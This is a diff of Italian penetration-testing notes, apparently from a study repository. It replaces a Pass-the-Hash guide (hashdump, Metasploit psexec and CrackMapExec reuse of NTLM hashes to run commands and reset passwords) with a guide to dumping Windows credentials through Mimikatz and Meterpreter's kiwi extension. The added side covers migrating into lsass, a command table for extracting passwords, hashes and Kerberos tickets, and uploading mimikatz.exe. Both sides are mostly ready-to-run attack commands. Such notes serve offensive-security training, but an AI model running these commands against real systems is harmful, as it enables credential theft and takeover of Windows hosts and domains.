@@ -1,85 +1,79 @@
-# Pass-the-Hash Attacks
+# Dumping Hashes con Mimikatz (via Kiwi Extension)
 
-Il Pass-the-Hash (PtH) è una tecnica che consente di autenticarsi su un sistema remoto senza conoscere la password in chiaro, utilizzando direttamente l’hash NTLM dell’utente. È un metodo estremamente potente nel contesto del penetration testing perché **bypassa la necessità di conoscere la password vera e propria**, e permette comunque di accedere a servizi remoti che accettano l’autenticazione NTLM (come SMB o WinRM).
+**Mimikatz** è un potente tool di post-exploitation scritto da Benjamin Delpy (`@gentilkiwi`) che consente di estrarre password in chiaro, hash, ticket Kerberos e altre credenziali dalla memoria di un sistema Windows. <br>
+Una delle sue integrazioni più comode è attraverso **Metasploit**, grazie all’estensione `kiwi`.
 
-La capacità di catturare un hash NTLM è quindi fondamentale: esso rappresenta la “firma” digitale della password, e può essere utilizzato per ottenere l’accesso a risorse di rete, spostarsi lateralmente all'interno dell'infrastruttura e perfino compromettere interi domini Active Directory. A differenza delle password in chiaro, **gli hash NTLM spesso non vengono ruotati regolarmente** e, una volta ottenuti, **rimangono validi per lunghi periodi**, specialmente se associati ad account amministrativi.
+Questa estensione permette di usare diverse funzioni di mimikatz direttamente da una sessione Meterpreter, evitando l’upload manuale del binario.
 
-## Estrazione credenziali con Kiwi/Mimikatz
+---
 
-Carica il modulo `kiwi` nella sessione Meterpreter attiva (ora migrata in LSASS):
+## 1 – Prerequisiti
 
-`load kiwi`
+Per funzionare correttamente, Mimikatz (e quindi `kiwi`) ha bisogno di **privilegi SYSTEM**, poiché il processo `lsass.exe` è protetto da Windows. Dopo aver ottenuto una shell su un target, assicurati di essere in un contesto privilegiato.
 
-Il modulo `kiwi` integra tutte le funzionalità di **Mimikatz**, un tool potentissimo che consente di:
+`pgrep lsass` individua il PID del processo lsass.exe <br>
+`migrate <PID>` migra la sessione Meterpreter in lsass.exe <br>
+`getuid ` verifica che stai operando come NT AUTHORITY\SYSTEM <br>
 
-- Estrare credenziali in chiaro dalla memoria
-- Dumpare hash NTLM e LM
-- Fare attacchi pass-the-hash
-- Interagire con i token di logon e impersonare utenti
-- Rubare ticket Kerberos (Kerberoasting)
 
-Per dumpare gli account locali dalla SAM (Security Account Manager):
+---
 
-`lsa_dump_sam`
+## 2 – Caricamento dell’estensione Kiwi
 
-La SAM è un database locale di Windows che contiene nomi utente, SID e hash delle password. Si trova nel filesystem in:
+Carica l’estensione con:
 
-`C:\Windows\System32\config\SAM`
+`load kiwi` carica le funzioni mimikatz integrate in Meterpreter <br>
 
-ed è accessibile **solo da un processo con privilegi SYSTEM o Kernel**.
+Per visualizzare tutti i comandi disponibili usa `?` oppure `help`
 
-Per ottenere direttamente LM e NTLM hash degli utenti locali:
+---
 
-`hashdump`
+## 3 – Comandi principali dell’estensione Kiwi
+```bash
+creds_all                  # Estrae tutte le credenziali dalla memoria
+creds_domain               # Estrae solo le credenziali del dominio
+creds_msv                  # Estrae le credenziali MSV1_0 (locali)
+creds_ssp                  # Estrae le credenziali SSP
+creds_tspkg                # Estrae le credenziali TSPKG
+creds_wdigest              # Estrae le credenziali in chiaro da WDIGEST (se abilitato)
+creds_kerberos             # Estrae ticket Kerberos attivi
+kerberos_ticket_use        # Usa un ticket Kerberos esistente (Pass-the-Ticket)
+kerberos_ticket_list       # Mostra tutti i ticket Kerberos caricati
+kerberos_ticket_purge      # Rimuove tutti i ticket
+lsa_dump_sam               # Dump del database SAM, SysKey e hash
+lsa_dump_secrets           # Estrae segreti e credenziali dalla memoria LSA
+misc_add_user              # Crea un nuovo utente nel sistema
+misc_cmd                   # Esegue un comando mimikatz personalizzato
+ps                         # Lista dei processi
+rev2self                   # Rimuove l’impersonificazione utente
+sekurlsa_logonpasswords    # Visualizza le credenziali delle sessioni logon
+token_list                 # Mostra i token utente disponibili
+token_impersonate          # Impersona un token selezionato
+ticket_purge               # Rimuove tutti i ticket Kerberos
+```
+## 4 – Dumping con Kiwi
 
-L’output ti mostra SID, LM Hash e NTLM Hash. L’hash NTLM è quello da usare per gli attacchi Pass-the-Hash. Si trova **prima del secondo “:”** e rappresenta l’identificativo univoco della password (in forma cifrata).
+Comandi pratici:
 
-## Riutilizzo dell’hash – PsExec con Metasploit
+`creds_all` raccoglie tutte le credenziali disponibili <br>
+`lsa_dump_sam` dump del Security Account Manager (SAM) locale <br>
+`lsa_dump_secrets` estrae segreti memorizzati in LSA <br>
+`sekurlsa_logonpasswords` credenziali logon in memoria (se visibili) <br>
 
-Metti la sessione Meterpreter in background con `background` o `CTRL+Z`.
+---
 
-Poi usa:
+## 5 – Uso classico di Mimikatz su shell
 
-`use exploit/windows/smb/psexec`
+É possibile caricare direttamente il binario di mimikatz sul target usando l'upload:
 
-PsExec è un metodo legittimo utilizzato dagli amministratori Windows per eseguire programmi su macchine remote via SMB. Il modulo Metasploit ne replica il comportamento per ottenere una nuova shell con privilegi elevati.
+`upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` carica mimikatz <br>
+`shell` accedi a una shell <br>
+`.\mimikatz.exe` esegui mimikatz <br>
 
-Configura:
 
-`set RHOST <IP_target>` <br>
-`set SMBUser <utente_della_SAM>` <br>
-`set SMBPass <password_in_chiaro>` # oppure l’hash NTLM <br>   
-`set LPORT <porta_alternativa>` # diversa dalla sessione attuale <br>      
-`set target Native\ upload` <br>
+Comandi classici:
 
-È importante usare una `LPORT` diversa da quella precedente per permettere a Metasploit di aprire una seconda sessione parallela.
-
-Se stai usando l’hash NTLM, puoi specificarlo direttamente in `SMBPass`. L’intero hash può includere LM:NTLM, ma è sufficiente il solo hash NTLM.
-
-## Alternativa con CrackMapExec
-
-Un metodo più veloce e silenzioso è usare `crackmapexec`:
-
-`crackmapexec smb <IP> -u <username> -p "<password>"` 
-
-Oppure, se usi l’hash NTLM:
-
-`crackmapexec smb <IP> -u <username> -H <NTLM_hash>`
-
-Il comando tenterà l’autenticazione SMB. Se l’hash funziona, verrà mostrato l’indicatore:
-
-`[Pwn3d!]`
-
-Per eseguire comandi remoti (es. `whoami`, `ipconfig`, ecc.):
-
-`crackmapexec smb <IP> -u <username> -H <hash> -x "whoami"`
-
-Puoi anche cambiare la password di un utente con:
-
-`crackmapexec smb <IP> -u <username> -H <hash> -x "net user <user> <newPassword>"`
-
-Oppure ottenere la lista utenti della macchina:
-
-`crackmapexec smb <IP> -u <username> -H <hash> -x "net user"`
-
-Questi comandi ti consentono di ottenere pieno controllo operativo sul sistema target usando esclusivamente l’hash NTLM.
+`privilege::debug` verifica i privilegi <br>
+`lsadump::sam` dump SAM (hash + chiavi) <br>
+`lsadump::secrets` dump dei segreti <br>
+`sekurlsa::logonpasswords` credenziali salvate in memoria <br>
